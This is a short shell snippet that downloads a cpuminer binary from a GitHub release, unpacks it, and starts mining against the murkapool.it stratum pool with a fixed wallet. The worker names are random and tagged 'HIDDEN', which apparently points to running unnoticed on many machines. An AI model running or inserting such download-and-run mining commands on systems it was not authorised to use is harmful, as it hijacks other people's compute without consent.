wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
./cpuminer -a yespower -o stratum+tcp://murkapool.it:6253 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.$(echo $(shuf -i 1-2000 -n 1)-HIDDEN) -p c=CPMK
